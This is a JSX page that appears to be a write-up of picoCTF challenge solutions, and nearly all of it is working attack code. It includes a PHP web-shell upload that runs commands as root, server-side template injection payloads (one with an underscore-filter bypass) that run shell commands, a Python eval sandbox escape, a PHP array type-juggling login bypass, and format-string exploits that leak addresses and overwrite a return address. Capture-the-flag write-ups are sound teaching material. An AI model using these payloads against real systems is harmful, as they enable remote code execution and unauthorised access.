import X from 'src/component/X';

export default function Post() {
    return (
        <>
            <X.Image src="overview.jpg" width="800px" />
            <X.H1>Web</X.H1>
            <X.H2>n0s4n1ty-1</X.H2>
            <X.CodeBlock
                language="python"
                code={`
                import requests

                url = "http://standard-pizzas.picoctf.net:49315/"
                shell = '<?php system($_GET["cmd"]); ?>'
                resp = requests.post(url + "upload.php", data={"submit": "Upload File"}, files={
                    "fileToUpload": ("exp.php", shell),
                })
                print(resp.text, resp.status_code)  # The file exp.php has been uploaded Path: uploads/exp.php  200

                cmd = "sudo cat /root/flag.txt"
                resp = requests.get(url + "uploads/exp.php?cmd=" + cmd)
                print(resp.text)

                # picoCTF{wh47_c4n_u_d0_wPHP_5f894f6c}
                `}
            />
            <X.H2>WebSockFish</X.H2>
            <X.CodeBlock
                language="python"
                code={`
                import asyncio
                import websockets


                async def websocket_client():
                    uri = "ws://verbal-sleep.picoctf.net:61344/ws/"
                    async with websockets.connect(uri) as ws:
                        await ws.send("eval -100000")
                        response = await ws.recv()
                        print(f"Received: {response}")
                        # Received: Huh???? How can I be losing this badly... I resign... here's your flag: picoCTF{c1i3nt_s1d3_w3b_s0ck3t5_a2a9bbe9}


                asyncio.run(websocket_client())

                # picoCTF{c1i3nt_s1d3_w3b_s0ck3t5_a2a9bbe9}
                `}
            />
            <X.H2>SSTI1</X.H2>
            <X.CodeBlock
                language="python"
                code={`
                import requests

                url = "http://rescued-float.picoctf.net:50351/announce"

                payload = "{{1.__class__.__mro__[1].__subclasses__()[356]('cat flag',shell=True,stdout=-1).communicate()[0]}}"

                resp = requests.post(url, data={"content": payload})
                print(resp.text)

                # picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_df9a00a0}
                `}
            />
            <X.H2>SSTI2</X.H2>
            <X.CodeBlock
                language="python"
                code={`
                import requests

                url = "http://shape-facility.picoctf.net:61943/announce"

                payload = "{{1|attr('__class__')|attr('__mro__')|attr('__getitem__')(1)|attr('__subclasses__')()|attr('__getitem__')(356)('cat flag',shell=True,stdout=-1)|attr('communicate')()}}"
                payload = payload.replace("_", "\\\\x5f")

                resp = requests.post(url, data={"content": payload})
                print(resp.text)

                # picoCTF{sst1_f1lt3r_byp4ss_96a02202}
                `}
            />
            <X.H2>3v@l</X.H2>
            <X.CodeBlock
                language="python"
                code={`
                import requests

                url = "http://shape-facility.picoctf.net:64106/execute"

                code = "__import__('o''s').popen('ca''t '+chr(47)+'flag*').read()"

                resp = requests.post(url, data={"code": code})
                print(resp.text)

                # picoCTF{D0nt_Use_Unsecure_f@nctionsa4121ed2}
                `}
            />
            <X.H2>Apriti-sesamo</X.H2>
            <X.CodeBlock
                language="python"
                code={String.raw`
                import requests
                import base64
                import re

                # Step 1: leak backup file
                url = "http://verbal-sleep.picoctf.net:50765/impossibleLogin.php~"  # emacs backup file
                resp = requests.get(url)
                print(resp.text)

                # <?php
                #   if(isset($_POST[base64_decode("\144\130\x4e\154\x63\155\x35\x68\142\127\125\x3d")])&& isset($_POST[base64_decode("\143\x48\x64\x6b")])){$yuf85e0677=$_POST[base64_decode("\144\x58\x4e\154\x63\x6d\65\150\x62\127\x55\75")];$rs35c246d5=$_POST[base64_decode("\143\x48\144\153")];if($yuf85e0677==$rs35c246d5){echo base64_decode("\x50\x47\112\x79\x4c\172\x35\x47\x59\127\154\163\132\127\x51\x68\111\x45\x35\166\x49\x47\132\163\131\127\x63\x67\x5a\155\71\171\111\x48\x6c\166\x64\x51\x3d\x3d");}else{if(sha1($yuf85e0677)===sha1($rs35c246d5)){echo file_get_contents(base64_decode("\x4c\151\64\166\x5a\x6d\x78\x68\x5a\x79\65\60\145\110\x51\75"));}else{echo base64_decode("\x50\107\112\171\x4c\x7a\65\107\x59\x57\154\x73\x5a\127\x51\x68\x49\105\x35\x76\111\x47\132\x73\131\127\x63\x67\x5a\155\71\x79\x49\110\154\x76\x64\x51\x3d\75");}}}
                # ?>


                # Step 2: decode base64

                code = """
                <?php
                if(isset($_POST[base64_decode("\144\130\x4e\154\x63\155\x35\x68\142\127\125\x3d")])&& isset($_POST[base64_decode("\143\x48\x64\x6b")])){$yuf85e0677=$_POST[base64_decode("\144\x58\x4e\154\x63\x6d\65\150\x62\127\x55\75")];$rs35c246d5=$_POST[base64_decode("\143\x48\144\153")];if($yuf85e0677==$rs35c246d5){echo base64_decode("\x50\x47\112\x79\x4c\172\x35\x47\x59\127\154\163\132\127\x51\x68\111\x45\x35\166\x49\x47\132\163\131\127\x63\x67\x5a\155\71\171\111\x48\x6c\166\x64\x51\x3d\x3d");}else{if(sha1($yuf85e0677)===sha1($rs35c246d5)){echo file_get_contents(base64_decode("\x4c\151\64\166\x5a\x6d\x78\x68\x5a\x79\65\60\145\110\x51\75"));}else{echo base64_decode("\x50\107\112\171\x4c\x7a\65\107\x59\x57\154\x73\x5a\127\x51\x68\x49\105\x35\x76\111\x47\132\x73\131\127\x63\x67\x5a\155\71\x79\x49\110\154\x76\x64\x51\x3d\75");}}}
                ?>
                """
                code = re.sub(
                    r'base64_decode\("(.*?)"\)',
                    lambda match: '"' + base64.b64decode(match.group(1)).decode("utf-8") + '"',
                    code
                )
                print(code)

                # <?php
                #     if(isset($_POST["username"])&& isset($_POST["pwd"]))
                #     {
                #         $yuf85e0677=$_POST["username"];
                #         $rs35c246d5=$_POST["pwd"];
                #         if($yuf85e0677==$rs35c246d5)
                #         {
                #             echo "<br/>Failed! No flag for you";
                #         }
                #         else
                #         {
                #             if(sha1($yuf85e0677)===sha1($rs35c246d5))
                #             {
                #                 echo file_get_contents("../flag.txt");
                #             }
                #             else
                #             {
                #                 echo "<br/>Failed! No flag for you";
                #             }
                #         }
                #     }
                # ?>


                # Step 3: login
                resp = requests.post(url.rstrip("~"), data={
                    "username[]": "1",
                    "pwd[]": "2",
                })
                print(resp.text)

                # picoCTF{w3Ll_d3sErV3d_Ch4mp_2d9f3447}
                `}
            />
            <X.H1>Reversing</X.H1>
            <X.H2>Chronohack</X.H2>
            <X.CodeBlock
                language="python"
                code={`
                import socket
                import random
                import time

                port = 50408
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect(("verbal-sleep.picoctf.net", port))

                t1 = int(time.time() * 1000)
                data = s.recv(1024)
                print(data.decode())
                t2 = int(time.time() * 1000)


                def get_random(length):
                    alphabet = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"
                    random.seed(random.randint(t1, t2))
                    s = ""
                    for i in range(length):
                        s += random.choice(alphabet)
                    return s


                n = 0
                while n < 50:
                    user_guess = get_random(20)
                    s.sendall(user_guess.encode() + b"\\n")
                    response = s.recv(1024)
                    print(response.decode())
                    n += 1

                s.close()

                # picoCTF{UseSecure#$_Random@j3n3r@T0rsb5f8a5af}
                `}
            />
            <X.H2>perplexed</X.H2>
            <X.CodeBlock
                language="cpp"
                code={`
                #include <iostream>
                using namespace std;

                string realflag(27, '\\0');

                int check(string flag) // it means recover now ;)
                {
                    // if(flag.length() != 27) return 1;

                    unsigned char v[32] = {
                        0xE1, 0xA7, 0x1E, 0xF8, 0x75, 0x23, 0x7B, 0x61,
                        0xB9, 0x9D, 0xFC, 0x5A, 0x5B, 0xDF, 0x69,
                        0xD2, 0xFE, 0x1B, 0xED, 0xF4, 0xED, 0x67, 0xF4,
                        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
                    };
                    int charindex = 0, bitindex = 0;

                    for(int i = 0; i <= 0x16; ++i)
                    {
                        for(int j = 0; j <= 7; ++j)
                        {
                            if(!bitindex) bitindex = 1;
                            int bitmask1 = 1 << (7 - j);
                            int bitmask2 = 1 << (7 - bitindex);

                            // To better understand the process of comparison:
                            // printf("checking i=%d, bitmask1=%d, charindex=%d, bitmask2=%d\\n",
                            //     i, bitmask1, charindex, bitmask2);

                            // if( (bitmask1&v[i]) > 0 != (bitmask2&flag[charindex]) > 0 ) return 1;
                            // Recover the original flag:
                            if( (bitmask1&v[i]) > 0) realflag[charindex] |= bitmask2;

                            if(++bitindex == 8)
                            {
                                bitindex = 0;
                                ++charindex;
                            }

                            if(charindex == 27) return 0;
                        }
                    }
                    return 0;
                }

                int main()
                {
                    check(""); // anything
                    cout << realflag << endl; // picoCTF{0n3_bi7_4t_a_7im3}
                    return 0;
                }
                `}
            />
            <X.H1>General Skills</X.H1>
            <X.H2>YaraRules0x100</X.H2>
            <X.P>I solved it by enumerating the file hash of three TPs one by one...</X.P>
            <X.CodeBlock
                language="python"
                code={`
                import subprocess

                port = 54813
                rules_template = """
                import "hash"

                rule bf
                {{
                    condition:
                        hash.sha256(0, filesize) matches /^1b/ or
                        hash.sha256(0, filesize) matches /^8f/ or
                        hash.sha256(0, filesize) matches /^{}/
                }}
                """

                for i in range(256):
                    h = hex(i)[2:].zfill(2)  # 00, 01, ..., ff
                    rules = rules_template.format(h)
                    process = subprocess.Popen(
                        ["socat", "-t60", "-", f"TCP:standard-pizzas.picoctf.net:{port}"],
                        stdin=subprocess.PIPE,
                        stdout=subprocess.PIPE
                    )
                    stdout, stderr = process.communicate(input=rules.encode())
                    print(h, stdout)

                # picoCTF{yara_rul35_r0ckzzz_a73309a8}
                `}
            />
            <X.Image src="1.jpg" width="100%" />
            <X.H1>Pwn</X.H1>
            <X.H2>PIE TIME</X.H2>
            <X.CodeBlock
                language="python"
                code={`
                from pwn import *

                p = remote("rescued-float.picoctf.net", 60129)

                main = p.recvline().split(b" ")[-1].strip()
                main = int(main, 16)
                print("main:", hex(main))

                win = main + 0x12A7 - 0x133D
                win = hex(win)

                p.sendline(str(win).encode())
                print(p.recvall())

                # picoCTF{b4s1c_p051t10n_1nd3p3nd3nc3_a267144a}
                `}
            />
            <X.H2>PIE TIME 2</X.H2>
            <X.CodeBlock
                language="python"
                code={`
                from pwn import *

                p = remote("rescued-float.picoctf.net", 64931)

                p.recvuntil(b"name:")
                payload = b"aaaaaaab.%8$p.%25$p."  # buffer
                p.sendline(payload)
                # %8$p: start of buffer
                # %25$p: main

                resp = p.recvuntil(b": ")
                print(
                    "resp:", resp
                )  # resp: b'aaaaaaab.0x6261616161616161.0x5fe907376400.\\n enter the address to jump to, ex => 0x12345: '

                main = resp.split(b".")[2]
                main = int(main, 16)
                print("main:", hex(main))

                win = main + 0x136A - 0x1400
                win = hex(win)

                p.sendline(str(win).encode())
                print(p.recvall())

                # picoCTF{p13_5h0u1dn'7_134k_8c8ae861}
                `}
            />
            <X.H2>Echo Valley</X.H2>
            <X.CodeBlock
                language="python"
                code={`
                from pwn import *

                p = remote("shape-facility.picoctf.net", 60616)

                print(p.recvuntil("Try Shouting: \\n"))


                def print_stack(p):
                    stack_addr_22p = 0

                    def resp2str(addresses):
                        result = []
                        for addr in addresses:
                            addr_str = addr.decode()
                            if addr_str == "(nil)":
                                high, low = "00000000", "00000000"
                            else:
                                num = int(addr_str, 16)
                                high = f"{(num >> 32) & 0xFFFFFFFF:08x}"
                                low = f"{num & 0xFFFFFFFF:08x}"
                            result.extend([low, high])
                        return " ".join(result)

                    for i in range(2, 40, 2):
                        p.sendline(
                            f"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA@@@%{i}$p.%{i+1}$p@@@BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB"
                        )
                        resp = p.recvline()
                        addresses = resp.split(b"@@@")[1].split(b".")
                        print(f"%{i:2}$p:", resp2str(addresses))

                        # notice that the [value of %20$p] is the [stack address of %22$p]
                        if i == 20:
                            stack_addr_22p = int(addresses[0].decode(), 16)

                    return stack_addr_22p


                stack_addr_22p = print_stack(p)
                print(f"stack_addr_22p: {hex(stack_addr_22p)}")
                """
                % 2$p: 00000000 00000000 00000000 00000000
                % 4$p: 17c4230f 00005c20 00000000 00000000
                % 6$p: 41414141 41414141 41414141 41414141
                % 8$p: 41414141 41414141 41414141 41414141
                %10$p: 41414141 40414141 31254040 2e702430
                %12$p: 24333125 40404070 42424242 42424242
                %14$p: 42424242 42424242 42424242 42424242
                %16$p: 42424242 42424242 42424242 42424242
                %18$p: 0000000a 00000000 cd8ccd00 674cd41f
                %20$p: 9c3e5280 00007ffd(120cd413 00005c20)  <-- the value of %21$p is return address, ends with 0x413
                %22$p: 9c3e5320 00007ffd 9ed701ca 00007dd0
                %24$p: 9c3e52d0 00007ffd 9c3e53a8 00007ffd
                %26$p: 120cc040 00000001 120cd401 00005c20
                %28$p: 9c3e53a8 00007ffd 39525fe6 78889720
                %30$p: 00000001 00000000 00000000 00000000
                %32$p: 120cfd78 00005c20 9ef95000 00007dd0
                %34$p: 3a325fe6 78889720 9c105fe6 7cd292f2
                %36$p: 00000000 00007ffd 00000000 00000000
                %38$p: 00000000 00000000 00000001 00000000
                stack_addr_22p: 0x7ffd9c3e5280
                """

                p.sendline(f"%21$p")
                ret_addr_resp = p.recvline()
                ret_addr = int(ret_addr_resp.split(b": ")[-1].strip(), 16)
                print(f"ret_addr: {hex(ret_addr)}")

                # notice that the [value of %20$p] is the [stack address of %22$p]
                # set [value of address that %20$p points to] = [stack address of %21$p]
                # which means set [value of %22$p] = [stack address of %21$p]
                p.sendline(f"%{(stack_addr_22p & 0xFFFF) - 0x8}c%20$hn")
                p.recvline()

                # set [value of address that %22$p points to] = [address of print_flag]
                # which means set [value of %21$p] = [address of print_flag]
                p.sendline(f"%{(ret_addr & 0xFFFF) - 0x1413 + 0x1269}c%22$hn")
                p.recvline()

                p.sendline("exit")
                print(p.recvall())

                # picoctf{f1ckl3_f0rmat_f1asc0}
                `}
            />
        </>
    );
}
